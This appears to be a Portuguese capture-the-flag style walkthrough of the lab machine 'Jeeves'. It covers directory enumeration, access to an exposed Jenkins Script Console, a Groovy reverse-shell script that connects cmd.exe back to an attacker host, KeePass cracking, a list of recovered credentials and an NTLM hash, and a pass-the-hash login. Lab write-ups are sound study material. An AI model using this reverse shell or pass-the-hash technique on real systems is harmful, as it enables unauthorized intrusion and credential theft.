Enumeração de serviços:
![[Pasted image 20240205161513.png]]
Enumeração de diretórios:
``` bash
feroxbuster -u http://10.10.10.63:50000 -A -r -x txt -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -C 404
```
Descoberta do Jenkins rodando no endpoint: `/askjeeves`
Navegando nas configurações, temos a opção Script Console, onde podemos inserir scripts em Groovy que serão executados pelo servidor. Vamos então inserir um script que irá nos enviar o shell do host:
![[Pasted image 20240206080904.png]]
```groovy
String host="$LHOST";
int port=$LPORT;
String cmd="cmd.exe";

Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());
                     while(pe.available()>0)so.write(pe.read());
                     while(si.available()>0)po.write(si.read());
                     so.flush();po.flush();Thread.sleep(50);
                     try {p.exitValue();
                          break;
                         }catch (Exception e){}};
  p.destroy();
s.close();
```

Ao executar obtemos a shell do host:
![[Pasted image 20240206081048.png]]

Analisando os diretórios da máquina alvo, encontramos o arquivo CEH.kdbx que é uma base de dados de um cofre de senhas. Podemos quebrar a senha master com ajuda do John the Ripper:
![[Pasted image 20240206092222.png]]
Vamos então baixar o software KeePass, carregar o arquivo de backup e utilizar a senha encontrada:
![[Pasted image 20240206092756.png]]
Credenciais:
```
anonymous:Password
Michael321:12345
admin:S1TjAtJHKsugh9oC4VZl
hackerman123:pwndyouall!
bob:lCEUnYPjNfIuPZSzOySA
administrator:S1TjAtJHKsugh9oC4VZl
admin:
?:aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

Agora podemos utilizar o método Pass The Hash, para logar no alvo utilizando o hash encontrado.
```bash
pth-winexe -U
jeeves/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cb
e81fe00 //10.10.10.63 cmd
```